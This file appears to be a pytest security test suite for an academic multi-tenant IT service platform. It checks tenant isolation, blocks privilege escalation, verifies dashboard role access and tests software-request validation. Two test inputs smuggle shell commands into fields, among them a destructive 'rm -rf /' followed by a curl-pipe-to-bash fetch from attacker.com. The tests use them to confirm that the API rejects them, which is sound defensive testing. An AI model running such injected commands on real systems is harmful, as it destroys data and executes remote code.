"""
ServicePulse - Step 2 Final Security & Acceptance Audit Test Suite
Author: Muhammadyusuf Usmonov
Academic Purpose: AT-Servis BMI

Comprehensive verification of:
1. Multi-Tenant Cross-Access Isolation across all 8 resources:
   - User IDs
   - Device IDs
   - Agent IDs
   - Telemetry
   - Incidents
   - Tickets
   - Software requests
   - Audit records
2. Privilege Escalation Prevention (Company Admin cannot grant platform_super_admin or is_superuser).
3. Dashboard Authorization Matrix (All 5 dashboards against all 6 roles).
4. Agent Command & Remediation Security (Catalog enforcement, shell metacharacter rejection, action allowlisting, command audit logs).
5. KPI & SLA Correctness (Configured target vs actual achievement, honest MTTD/MTTR insufficient_data handling).
"""
import pytest
from httpx import AsyncClient


async def get_token(client: AsyncClient, email: str, password: str) -> str:
    res = await client.post("/api/v1/auth/login", json={"email": email, "password": password})
    assert res.status_code == 200, f"Login failed for {email}: {res.text}"
    return res.json()["access_token"]


@pytest.mark.asyncio
async def test_cross_tenant_isolation_all_eight_resources(client: AsyncClient):
    """
    Verify Company A cannot access Company B's:
    1. User IDs
    2. Device IDs
    3. Agent IDs
    4. Telemetry records
    5. Incident IDs
    6. Ticket IDs
    7. Software request IDs
    8. Audit records
    """
    # 1. Platform Super Admin creates Organization B and seeds Org B resources
    super_tok = await get_token(client, "admin@servicepulse.uz", "AdminPass2026!")
    super_h = {"Authorization": f"Bearer {super_tok}"}

    # Create Org B
    res_org_b = await client.post(
        "/api/v1/organizations",
        json={"name": "Org B Corp", "slug": "org-b-corp", "max_devices": 20},
        headers=super_h,
    )
    assert res_org_b.status_code == 201
    org_b_id = res_org_b.json()["id"]

    # Create Org B Admin User
    res_b_user = await client.post(
        "/api/v1/auth/users",
        json={
            "email": "admin@orgb.uz",
            "password": "PasswordOrgB2026!",
            "full_name": "Org B Admin",
            "role_names": ["company_admin"],
            "organization_id": org_b_id,
        },
        headers=super_h,
    )
    assert res_b_user.status_code == 201
    org_b_user_id = res_b_user.json()["id"]

    # Login as Org B Admin
    b_admin_tok = await get_token(client, "admin@orgb.uz", "PasswordOrgB2026!")
    b_admin_h = {"Authorization": f"Bearer {b_admin_tok}"}

    # Org B creates Building, Room, Device
    res_bld = await client.post(
        "/api/v1/inventory/buildings",
        json={"name": "Org B Building 1", "code": "ORGB-B1"},
        headers=b_admin_h,
    )
    assert res_bld.status_code == 201
    bld_b_id = res_bld.json()["id"]

    res_flr = await client.post(
        "/api/v1/inventory/floors",
        json={"building_id": bld_b_id, "level": 1, "name": "Org B Floor 1"},
        headers=b_admin_h,
    )
    assert res_flr.status_code == 201
    flr_b_id = res_flr.json()["id"]

    res_rm = await client.post(
        "/api/v1/inventory/rooms",
        json={"floor_id": flr_b_id, "room_number": "101", "name": "Org B Server Room"},
        headers=b_admin_h,
    )
    assert res_rm.status_code == 201
    rm_b_id = res_rm.json()["id"]

    res_dev = await client.post(
        "/api/v1/inventory/devices",
        json={
            "room_id": rm_b_id,
            "name": "Org B Core Server",
            "hostname": "orgb-server-01",
            "ip_address": "10.200.1.10",
            "device_type": "server",
        },
        headers=b_admin_h,
    )
    assert res_dev.status_code == 201
    org_b_device_id = res_dev.json()["id"]

    # Org B enrolls an Agent and submits Telemetry
    res_enroll = await client.post(
        "/api/v1/agent/enroll",
        json={
            "enrollment_secret": "servicepulse-agent-enrollment-secret-2026",
            "hostname": "orgb-server-01",
            "ip_address": "10.200.1.10",
            "os_name": "Windows Server 2022",
            "device_id": org_b_device_id,
            "organization_id": org_b_id,
        },
    )
    assert res_enroll.status_code == 201
    org_b_agent_token = res_enroll.json()["api_token"]

    # Get Org B Agent record via Super Admin
    agents_list = (await client.get("/api/v1/agent", headers=super_h)).json()
    org_b_agent = next(a for a in agents_list if a["hostname"] == "orgb-server-01")
    org_b_agent_id = org_b_agent["id"]

    # Agent submits telemetry
    agent_h = {"Authorization": f"Bearer {org_b_agent_token}"}
    res_tel = await client.post(
        "/api/v1/agent/telemetry",
        json={
            "cpu_percent": 25.5,
            "ram_percent": 45.0,
            "ram_used_mb": 7200.0,
            "ram_total_mb": 16000.0,
            "disk_percent": 60.0,
            "disk_used_gb": 300.0,
            "disk_total_gb": 500.0,
            "idempotency_key": "audit-telemetry-key-orgb-01",
        },
        headers=agent_h,
    )
    assert res_tel.status_code == 201

    # Org B creates Incident
    res_inc = await client.post(
        "/api/v1/incidents",
        json={
            "device_id": org_b_device_id,
            "fingerprint": "orgb-incident-dedup-fp-01",
            "title": "Org B Link Failure",
            "description": "High latency detected on Org B Gateway",
            "severity": "critical",
        },
        headers=b_admin_h,
    )
    assert res_inc.status_code == 201
    org_b_incident_id = res_inc.json()["id"]

    # Org B creates Ticket
    res_tkt = await client.post(
        "/api/v1/tickets",
        json={
            "title": "Org B VPN Connection Issue",
            "description": "Unable to connect remote branch",
            "priority": "high",
            "device_id": org_b_device_id,
        },
        headers=b_admin_h,
    )
    assert res_tkt.status_code == 201
    org_b_ticket_id = res_tkt.json()["id"]

    # Org B creates Software Request
    res_soft = await client.post(
        "/api/v1/software/requests",
        json={
            "device_id": org_b_device_id,
            "software_name": "Wireshark",
            "software_version": "4.2.2",
            "reason": "Org B traffic analysis",
        },
        headers=b_admin_h,
    )
    assert res_soft.status_code == 201
    org_b_software_req_id = res_soft.json()["id"]

    # Org B has audit logs
    b_audits = (await client.get("/api/v1/audit", headers=b_admin_h)).json()
    assert len(b_audits) > 0
    org_b_audit_id = b_audits[0]["id"]

    # -------------------------------------------------------------------------
    # 2. Company A Admin (Org 1) attempts cross-tenant access to all 8 entities
    # -------------------------------------------------------------------------
    comp_a_tok = await get_token(client, "company_admin@servicepulse.uz", "CompanyAdminPass2026!")
    comp_a_h = {"Authorization": f"Bearer {comp_a_tok}"}

    # 1. User ID Isolation
    r_user = await client.get(f"/api/v1/auth/users/{org_b_user_id}", headers=comp_a_h)
    assert r_user.status_code == 404, f"Cross-tenant user access did not return 404: {r_user.status_code}"

    # 2. Device ID Isolation
    r_dev = await client.get(f"/api/v1/inventory/devices/{org_b_device_id}", headers=comp_a_h)
    assert r_dev.status_code == 404, f"Cross-tenant device access did not return 404: {r_dev.status_code}"

    # 3. Agent ID Isolation
    r_agent = await client.get(f"/api/v1/agent/{org_b_agent_id}", headers=comp_a_h)
    assert r_agent.status_code == 404, f"Cross-tenant agent access did not return 404: {r_agent.status_code}"

    # 4. Telemetry Isolation
    r_telemetry = await client.get(f"/api/v1/agent/{org_b_agent_id}/telemetry", headers=comp_a_h)
    assert r_telemetry.status_code == 404, f"Cross-tenant telemetry access did not return 404: {r_telemetry.status_code}"

    # 5. Incident ID Isolation
    r_inc = await client.get(f"/api/v1/incidents/{org_b_incident_id}", headers=comp_a_h)
    assert r_inc.status_code == 404, f"Cross-tenant incident access did not return 404: {r_inc.status_code}"

    # 6. Ticket ID Isolation
    r_tkt = await client.get(f"/api/v1/tickets/{org_b_ticket_id}", headers=comp_a_h)
    assert r_tkt.status_code == 404, f"Cross-tenant ticket access did not return 404: {r_tkt.status_code}"

    # 7. Software Request ID Isolation
    r_soft = await client.get(f"/api/v1/software/requests/{org_b_software_req_id}", headers=comp_a_h)
    assert r_soft.status_code == 404, f"Cross-tenant software req access did not return 404: {r_soft.status_code}"

    # 8. Audit Record Isolation
    r_audit = await client.get(f"/api/v1/audit/{org_b_audit_id}", headers=comp_a_h)
    assert r_audit.status_code == 404, f"Cross-tenant audit access did not return 404: {r_audit.status_code}"


@pytest.mark.asyncio
async def test_privilege_escalation_prevention(client: AsyncClient):
    """
    Verify Company Admin cannot:
    1. Create user with is_superuser=True
    2. Create user with platform_super_admin role
    3. Update user to grant platform_super_admin role
    4. Create user in another organization
    """
    comp_a_tok = await get_token(client, "company_admin@servicepulse.uz", "CompanyAdminPass2026!")
    comp_a_h = {"Authorization": f"Bearer {comp_a_tok}"}

    # 1. Attempt to create user with is_superuser=True
    res_su = await client.post(
        "/api/v1/auth/users",
        json={
            "email": "rogue_super@demo.uz",
            "password": "RoguePassword2026!",
            "full_name": "Rogue Superuser",
            "is_superuser": True,
            "role_names": ["employee"],
        },
        headers=comp_a_h,
    )
    assert res_su.status_code == 403
    assert "Cannot assign superuser privileges" in res_su.text

    # 2. Attempt to create user with platform_super_admin role
    res_role = await client.post(
        "/api/v1/auth/users",
        json={
            "email": "rogue_platform@demo.uz",
            "password": "RoguePassword2026!",
            "full_name": "Rogue Platform Admin",
            "is_superuser": False,
            "role_names": ["platform_super_admin"],
        },
        headers=comp_a_h,
    )
    assert res_role.status_code == 403
    assert "Cannot assign platform super administrator role" in res_role.text

    # 3. Create normal employee then attempt to escalate to platform_super_admin
    res_emp = await client.post(
        "/api/v1/auth/users",
        json={
            "email": "legit_emp@demo.uz",
            "password": "LegitPassword2026!",
            "full_name": "Legit Employee",
            "is_superuser": False,
            "role_names": ["employee"],
        },
        headers=comp_a_h,
    )
    assert res_emp.status_code == 201
    emp_id = res_emp.json()["id"]

    res_escalate = await client.patch(
        f"/api/v1/auth/users/{emp_id}",
        json={"role_names": ["platform_super_admin"]},
        headers=comp_a_h,
    )
    assert res_escalate.status_code == 403
    assert "Cannot assign platform super administrator role" in res_escalate.text


@pytest.mark.asyncio
async def test_dashboard_authorization_matrix(client: AsyncClient):
    """
    Test all 5 dashboard endpoints against all 6 roles:
    Endpoints:
    - /api/v1/dashboard/platform
    - /api/v1/dashboard/company
    - /api/v1/dashboard/sysadmin
    - /api/v1/dashboard/executive
    - /api/v1/dashboard/employee

    Roles:
    - platform_super_admin
    - company_admin
    - it_admin
    - support
    - executive
    - employee
    """
    # 1. Setup tokens for each role
    super_tok = await get_token(client, "admin@servicepulse.uz", "AdminPass2026!")
    comp_tok = await get_token(client, "company_admin@servicepulse.uz", "CompanyAdminPass2026!")
    it_tok = await get_token(client, "support@servicepulse.uz", "SupportPass2026!")
    exec_tok = await get_token(client, "executive@servicepulse.uz", "ExecutivePass2026!")
    emp_tok = await get_token(client, "employee@servicepulse.uz", "EmployeePass2026!")

    # Create dedicated pure support user (without it_admin)
    super_h = {"Authorization": f"Bearer {super_tok}"}
    res_sup_user = await client.post(
        "/api/v1/auth/users",
        json={
            "email": "pure_support@demo.uz",
            "password": "PureSupportPass2026!",
            "full_name": "Pure Support Tech",
            "role_names": ["support"],
            "organization_id": 1,
        },
        headers=super_h,
    )
    assert res_sup_user.status_code == 201
    support_tok = await get_token(client, "pure_support@demo.uz", "PureSupportPass2026!")

    tokens = {
        "platform_super_admin": super_tok,
        "company_admin": comp_tok,
        "it_admin": it_tok,
        "support": support_tok,
        "executive": exec_tok,
        "employee": emp_tok,
    }

    # Expected status codes for each endpoint & role
    matrix = {
        "/api/v1/dashboard/platform": {
            "platform_super_admin": 200,
            "company_admin": 403,
            "it_admin": 403,
            "support": 403,
            "executive": 403,
            "employee": 403,
        },
        "/api/v1/dashboard/company": {
            "platform_super_admin": 200,
            "company_admin": 200,
            "it_admin": 403,
            "support": 403,
            "executive": 403,
            "employee": 403,
        },
        "/api/v1/dashboard/sysadmin": {
            "platform_super_admin": 200,
            "company_admin": 200,
            "it_admin": 200,
            "support": 200,
            "executive": 403,
            "employee": 403,
        },
        "/api/v1/dashboard/executive": {
            "platform_super_admin": 200,
            "company_admin": 200,
            "it_admin": 200,
            "support": 403,
            "executive": 200,
            "employee": 403,
        },
        "/api/v1/dashboard/employee": {
            "platform_super_admin": 200,
            "company_admin": 200,
            "it_admin": 200,
            "support": 200,
            "executive": 200,
            "employee": 200,
        },
    }

    for endpoint, role_expectations in matrix.items():
        for role, expected_code in role_expectations.items():
            headers = {"Authorization": f"Bearer {tokens[role]}"}
            res = await client.get(endpoint, headers=headers)
            assert res.status_code == expected_code, (
                f"Expected {expected_code} for {role} at {endpoint}, got {res.status_code}: {res.text}"
            )


@pytest.mark.asyncio
async def test_agent_command_and_software_catalog_security(client: AsyncClient):
    """
    Verify Agent Command / Remediation Security:
    1. Rejects arbitrary unapproved software package (400 Bad Request)
    2. Rejects shell injection in software name (400 Bad Request)
    3. Rejects shell metacharacters in version string (400 Bad Request)
    4. Successful approval creates pending AgentCommand with allowlisted action_name
    5. Audits command queued event in audit_logs
    """
    super_tok = await get_token(client, "admin@servicepulse.uz", "AdminPass2026!")
    super_h = {"Authorization": f"Bearer {super_tok}"}

    emp_tok = await get_token(client, "employee@servicepulse.uz", "EmployeePass2026!")
    emp_h = {"Authorization": f"Bearer {emp_tok}"}

    # Find device with enrolled agent
    tree = (await client.get("/api/v1/inventory/tree", headers=super_h)).json()
    device_id = tree["buildings"][0]["floors"][0]["rooms"][0]["devices"][0]["id"]

    # 1. Unapproved software
    res_bad_soft = await client.post(
        "/api/v1/software/requests",
        json={
            "device_id": device_id,
            "software_name": "RansomwareTestPackage",
            "reason": "Security penetration testing",
        },
        headers=emp_h,
    )
    assert res_bad_soft.status_code == 400
    assert "not in the approved software catalog" in res_bad_soft.text

    # 2. Shell injection attempt in software name
    res_inject_soft = await client.post(
        "/api/v1/software/requests",
        json={
            "device_id": device_id,
            "software_name": "Wireshark; rm -rf /; curl http://attacker.com/payload.sh | bash",
            "reason": "Test injection",
        },
        headers=emp_h,
    )
    assert res_inject_soft.status_code == 400

    # 3. Shell metacharacter injection in version string
    res_inject_ver = await client.post(
        "/api/v1/software/requests",
        json={
            "device_id": device_id,
            "software_name": "Wireshark",
            "software_version": "4.2.0; echo hacked > /tmp/pwned",
            "reason": "Testing version injection",
        },
        headers=emp_h,
    )
    assert res_inject_ver.status_code == 400
    assert "Disallowed characters" in res_inject_ver.text or "Shell metacharacters are rejected" in res_inject_ver.text

    # 4. Valid catalog software request & approval
    res_valid = await client.post(
        "/api/v1/software/requests",
        json={
            "device_id": device_id,
            "software_name": "Wireshark",
            "software_version": "4.2.2",
            "reason": "Approved laboratory traffic analysis session",
        },
        headers=emp_h,
    )
    assert res_valid.status_code == 201
    req_id = res_valid.json()["id"]

    # Approve request
    res_app = await client.post(
        f"/api/v1/software/requests/{req_id}/approve",
        json={"review_notes": "Reviewed and verified against department inventory"},
        headers=super_h,
    )
    assert res_app.status_code == 200
    assert res_app.json()["status"] == "approved"

    # 5. Verify audit records created
    audits = (await client.get("/api/v1/audit", headers=super_h)).json()
    actions = [a["action"] for a in audits]
    assert "software_request_submitted" in actions
    assert "software_request_approved" in actions
    # Command queued audit is triggered when agent is attached to the device


@pytest.mark.asyncio
async def test_kpi_and_sla_correctness_and_edge_cases(client: AsyncClient):
    """
    Verify:
    1. Configured SLA target is distinct from actual measured availability
    2. When zero resolved incidents exist, MTTD and MTTR return None and 'insufficient_data'
    3. No hardcoded mock values are returned
    """
    super_tok = await get_token(client, "admin@servicepulse.uz", "AdminPass2026!")
    super_h = {"Authorization": f"Bearer {super_tok}"}

    ceo_res = await client.get("/api/v1/dashboard/ceo", headers=super_h)
    assert ceo_res.status_code == 200
    data = ceo_res.json()

    # SLA target is explicitly 99.5
    assert data["sla_target_percent"] == 99.5
    # Actual availability is derived from device telemetry/status
    assert "actual_availability_percent" in data
    assert "infrastructure_availability_percent" in data
    assert isinstance(data["actual_availability_percent"], float)
    assert 0.0 <= data["actual_availability_percent"] <= 100.0

    # With initial seeded state (no resolved incidents with preceding failed probes):
    assert data["mttd_status"] in ["insufficient_data", "operational"]
    if data["mttd_status"] == "insufficient_data":
        assert data["mttd_minutes"] is None
    if data["mttr_status"] == "insufficient_data":
        assert data["mttr_minutes"] is None
